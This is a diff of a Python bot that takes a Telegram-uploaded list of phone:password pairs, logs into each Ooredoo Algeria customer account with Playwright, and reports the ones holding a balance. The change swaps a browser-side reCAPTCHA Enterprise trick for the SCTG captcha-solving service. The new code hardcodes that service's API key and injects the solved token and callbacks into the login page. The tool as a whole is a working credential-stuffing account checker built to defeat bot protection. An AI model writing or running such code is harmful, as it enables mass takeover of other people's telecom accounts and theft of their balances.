@@ -1,10 +1,7 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-Ooredoo Railway Bot
-- Playwright browser
-- Telegram interface
-- Auto reCAPTCHA solving (Enterprise)
+Ooredoo Railway Bot - with SCTG Captcha Solver
 """
 
 import os
@@ -37,6 +34,11 @@ MIN_BALANCE = int(os.getenv("MIN_BALANCE", "100"))
 HEADLESS = os.getenv("HEADLESS", "true").lower() == "true"
 RETRY_DELAY = 3
 MAX_RETRY = 10
+
+# SCTG API
+SCTG_API_KEY = os.getenv("SCTG_API_KEY", "Uosbi2t23tLFF7D1ro9yyX1EOJ61ER8I")
+SCTG_SUBMIT = "https://api.sctg.xyz/in.php"
+SCTG_RESULT = "https://api.sctg.xyz/res.php"
 
 SIGNIN_URL = "https://my.ooredoo.dz/sign-in"
 DASHBOARD_URL = "https://my.ooredoo.dz/dashboard/my-ooredoo"
@@ -120,7 +122,6 @@ def parse_accounts(text):
 
 
 def find_balance_in_text(text):
-    """يبحث عن الرصيد في نص الصفحة"""
     if not text:
         return None
     pats = [
@@ -166,12 +167,13 @@ def is_retryable(text):
 
 
 # ============================================================
-#  🧩 حل reCAPTCHA Enterprise (مجاني — بلا خدمة)
+#  🧩 SCTG Captcha Solver
 # ============================================================
-async def solve_recaptcha(page, bot, chat_id):
-    """يحل reCAPTCHA Enterprise Invisible باستدعاء grecaptcha مباشرة"""
+async def solve_recaptcha_sctg(page, bot, chat_id):
+    """يحل reCAPTCHA Enterprise Invisible عبر SCTG API"""
+    import httpx
+
     try:
-        # نلقاو site key
         site_key = await page.evaluate("""
             () => {
                 const scripts = [...document.querySelectorAll('script[src]')];
@@ -192,90 +194,164 @@ async def solve_recaptcha(page, bot, chat_id):
         """)
 
         if not site_key:
+            log.warning("No reCAPTCHA site key")
             return None
 
-        log.info("reCAPTCHA site key: %s", site_key)
+        page_url = page.url
+        log.info("SCTG: site_key=%s page_url=%s", site_key, page_url)
+
         await bot.send_message(
             chat_id=chat_id,
-            text=f"🧩 <b>كابتشا</b> — نحاول نحلها\nSite Key: <code>{site_key[:30]}...</code>",
+            text=(
+                f"🧩 <b>SCTG يحل الكابتشا</b>\n"
+                f"Site Key: <code>{site_key[:35]}...</code>"
+            ),
             parse_mode="HTML",
         )
 
-        # نستنو grecaptcha
-        for _ in range(30):
-            ok = await page.evaluate("() => !!(window.grecaptcha && window.grecaptcha.enterprise)")
-            if ok:
-                break
-            await asyncio.sleep(0.5)
-
-        # نحلو
-        token = await page.evaluate(
-            """
-            async (siteKey) => {
-                return new Promise((resolve) => {
-                    try {
-                        window.grecaptcha.enterprise.ready(async () => {
-                            try {
-                                const t = await window.grecaptcha.enterprise.execute(
-                                    siteKey, {action: 'login'}
-                                );
-                                resolve(t);
-                            } catch (e) {
-                                resolve(null);
-                            }
-                        });
-                    } catch (e) {
-                        resolve(null);
-                    }
-                    setTimeout(() => resolve(null), 20000);
-                });
+        async with httpx.AsyncClient(timeout=60) as client:
+            # Submit
+            submit_data = {
+                "key": SCTG_API_KEY,
+                "method": "userrecaptcha",
+                "googlekey": site_key,
+                "pageurl": page_url,
+                "enterprise": 1,
+                "invisible": 1,
+                "version": "v3",
+                "action": "login",
+                "json": 1,
             }
-            """,
-            site_key,
-        )
+            r = await client.post(SCTG_SUBMIT, data=submit_data)
+            log.info("SCTG submit: %s", r.text[:200])
 
-        if not token:
+            try:
+                resp = r.json()
+            except Exception:
+                await bot.send_message(
+                    chat_id=chat_id,
+                    text=f"❌ SCTG submit فشل: <code>{r.text[:200]}</code>",
+                    parse_mode="HTML",
+                )
+                return None
+
+            if resp.get("status") != 1:
+                await bot.send_message(
+                    chat_id=chat_id,
+                    text=f"❌ SCTG submit error: <code>{resp.get('request')}</code>",
+                    parse_mode="HTML",
+                )
+                return None
+
+            captcha_id = resp["request"]
+            log.info("SCTG id: %s", captcha_id)
+
+            # Poll
+            start = time.time()
+            token = None
+            while time.time() - start < 180:
+                await asyncio.sleep(5)
+                rr = await client.get(
+                    SCTG_RESULT,
+                    params={
+                        "key": SCTG_API_KEY,
+                        "action": "get",
+                        "id": captcha_id,
+                        "json": 1,
+                    },
+                )
+                try:
+                    data = rr.json()
+                except Exception:
+                    continue
+
+                if data.get("status") == 1:
+                    token = data["request"]
+                    break
+                elif data.get("request") == "CAPCHA_NOT_READY":
+                    continue
+                else:
+                    await bot.send_message(
+                        chat_id=chat_id,
+                        text=f"❌ SCTG error: <code>{data.get('request')}</code>",
+                        parse_mode="HTML",
+                    )
+                    return None
+
+            if not token:
+                await bot.send_message(
+                    chat_id=chat_id,
+                    text="⏰ SCTG timeout",
+                    parse_mode="HTML",
+                )
+                return None
+
+            log.info("SCTG token: %s...", token[:30])
+
+            # Inject token
+            await page.evaluate(
+                """
+                (t) => {
+                    let ta = document.querySelector(
+                        "textarea[name='g-recaptcha-response'], #g-recaptcha-response"
+                    );
+                    if (!ta) {
+                        ta = document.createElement('textarea');
+                        ta.name = 'g-recaptcha-response';
+                        ta.id = 'g-recaptcha-response';
+                        ta.style.display = 'none';
+                        document.body.appendChild(ta);
+                    }
+                    ta.value = t;
+                    ta.dispatchEvent(new Event('input', {bubbles: true}));
+                    ta.dispatchEvent(new Event('change', {bubbles: true}));
+                }
+                """,
+                token,
+            )
+
+            # Update grecaptcha callback if exists
+            try:
+                await page.evaluate(
+                    """
+                    (t) => {
+                        if (window.___grecaptcha_cfg) {
+                            const clients = window.___grecaptcha_cfg.clients || {};
+                            for (const id in clients) {
+                                const c = clients[id];
+                                if (c && c.callback) {
+                                    try { c.callback(t); } catch(e) {}
+                                }
+                            }
+                        }
+                    }
+                    """,
+                    token,
+                )
+            except Exception:
+                pass
+
             await bot.send_message(
                 chat_id=chat_id,
-                text="❌ <b>فشل حل الكابتشا</b> تلقائياً",
+                text=f"✅ <b>SCTG حل الكابتشا</b>\n<code>{token[:40]}...</code>",
                 parse_mode="HTML",
             )
-            return None
-
-        log.info("Got reCAPTCHA token: %s...", token[:30])
-
-        # نحطو في textarea
-        await page.evaluate(
-            """
-            (t) => {
-                let ta = document.querySelector(
-                    "textarea[name='g-recaptcha-response'], #g-recaptcha-response"
-                );
-                if (!ta) {
-                    ta = document.createElement('textarea');
-                    ta.name = 'g-recaptcha-response';
-                    ta.id = 'g-recaptcha-response';
-                    ta.style.display = 'none';
-                    document.body.appendChild(ta);
-                }
-                ta.value = t;
-                ta.dispatchEvent(new Event('input', {bubbles: true}));
-                ta.dispatchEvent(new Event('change', {bubbles: true}));
-            }
-            """,
-            token,
-        )
-
-        await bot.send_message(
-            chat_id=chat_id,
-            text="✅ <b>نجح حل الكابتشا</b>",
-            parse_mode="HTML",
-        )
-        return token
+            return token
 
     except Exception as e:
-        log.error("solve_recaptcha error: %s", e)
+        log.exception("SCTG error")
+        try:
+            await bot.send_message(
+                chat_id=chat_id,
+                text=f"❌ SCTG exception: <code>{e}</code>",
+                parse_mode="HTML",
+            )
+        except Exception:
+            pass
         return None
+
+
+solve_recaptcha = solve_recaptcha_sctg
 
 
 # ============================================================
@@ -304,7 +380,7 @@ async def hide_overlays(page):
 
 async def fill_username(page, username):
     try:
-        found = await page.evaluate("""
+        return bool(await page.evaluate("""
             (val) => {
                 const labels = [...document.querySelectorAll('label, .v-label, p')];
                 let target = null;
@@ -337,15 +413,14 @@ async def fill_username(page, username):
                 target.dispatchEvent(new Event('blur', {bubbles: true}));
                 return true;
             }
-        """, username)
-        return bool(found)
+        """, username))
     except Exception:
         return False
 
 
 async def fill_password(page, password):
     try:
-        ok = await page.evaluate("""
+        return bool(await page.evaluate("""
             (val) => {
                 const pwd = document.querySelector('input[type=password]');
                 if (!pwd) return false;
@@ -359,15 +434,14 @@ async def fill_password(page, password):
                 pwd.dispatchEvent(new Event('blur', {bubbles: true}));
                 return true;
             }
-        """, password)
-        return bool(ok)
+        """, password))
     except Exception:
         return False
 
 
 async def click_connexion(page):
     try:
-        ok = await page.evaluate("""
+        return bool(await page.evaluate("""
             () => {
                 const btns = [...document.querySelectorAll('button')];
                 const t = btns.find(b => /connexion|se connecter/i.test(b.textContent || ''));
@@ -376,8 +450,7 @@ async def click_connexion(page):
                 t.click();
                 return true;
             }
-        """)
-        return bool(ok)
+        """))
     except Exception:
         return False
 
@@ -419,7 +492,6 @@ async def is_logged_in(page):
 #  🎯 محاولة حساب
 # ============================================================
 async def try_account(browser, user, pwd, bot, chat_id):
-    """يرجع: dict {"status":..., "balance":...}"""
     ctx = await browser.new_context(
         locale="fr-FR",
         viewport={"width": 412, "height": 915},
@@ -443,7 +515,6 @@ async def try_account(browser, user, pwd, bot, chat_id):
 
         await page.wait_for_timeout(200)
 
-        # نحلو reCAPTCHA
         token = await solve_recaptcha(page, bot, chat_id)
         if token:
             state["stats"].captchas_solved += 1
@@ -454,7 +525,6 @@ async def try_account(browser, user, pwd, bot, chat_id):
             await ctx.close()
             return {"status": "retry"}
 
-        # نستنو النتيجة
         start = time.time()
         while time.time() - start < 25:
             if await is_logged_in(page):
@@ -475,7 +545,6 @@ async def try_account(browser, user, pwd, bot, chat_id):
 
             await page.wait_for_timeout(500)
 
-        # timeout
         await ctx.close()
         return {"status": "retry", "msg": "timeout"}
 
@@ -503,6 +572,7 @@ async def run_check(app, chat_id, accounts):
             f"🚀 <b>بداية الفحص</b>\n"
             f"عدد: <b>{len(accounts)}</b>\n"
             f"الحد: <b>{MIN_BALANCE}</b> دج\n"
+            f"🧩 SCTG solver: مفعّل\n"
             f"/stop للإيقاف."
         ),
         parse_mode="HTML",
@@ -532,8 +602,8 @@ async def run_check(app, chat_id, accounts):
 
                     try:
                         r = await try_account(browser, user, pwd, bot, chat_id)
-                    except Exception as e:
-                        log.exception("account check failed")
+                    except Exception:
+                        log.exception("account failed")
                         r = {"status": "retry"}
 
                     if r["status"] == "success":
@@ -595,15 +665,14 @@ async def run_check(app, chat_id, accounts):
 
 
 # ============================================================
-#  🤖 Telegram Handlers
+#  🤖 Handlers
 # ============================================================
 async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(
-        "🚀 <b>بوت Ooredoo Railway</b>\n\n"
+        "🚀 <b>بوت Ooredoo Railway + SCTG</b>\n\n"
         "ابعتلي ملف <code>accounts.txt</code>:\n"
         "<code>0553372434:password</code>\n\n"
-        "الأوامر:\n"
-        "/start\n/status\n/stop",
+        "/start /status /stop",
         parse_mode="HTML",
     )
 
@@ -643,10 +712,7 @@ async def handle_document(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     accounts = parse_accounts(text)
 
     if not accounts:
-        await update.message.reply_text(
-            "❌ الملف فارغ أو الصيغة غالطة.",
-            parse_mode="HTML",
-        )
+        await update.message.reply_text("❌ الملف فارغ أو الصيغة غالطة.", parse_mode="HTML")
         return
 
     state["running"] = True
@@ -685,7 +751,7 @@ async def handle_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
 #  Main
 # ============================================================
 def main():
-    print("🚀 Ooredoo Railway Bot starting...")
+    print("🚀 Ooredoo Railway Bot + SCTG starting...")
     if not TELEGRAM_TOKEN or not TELEGRAM_CHAT_ID:
         raise Exception("TELEGRAM_TOKEN أو TELEGRAM_CHAT_ID ناقصين")
 
@@ -715,7 +781,7 @@ def main():
     app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
 
-    print("✅ Bot is running")
+    print("✅ Bot running")
     app.run_polling(allowed_updates=Update.ALL_TYPES, poll_interval=2.0, timeout=30)
 
 
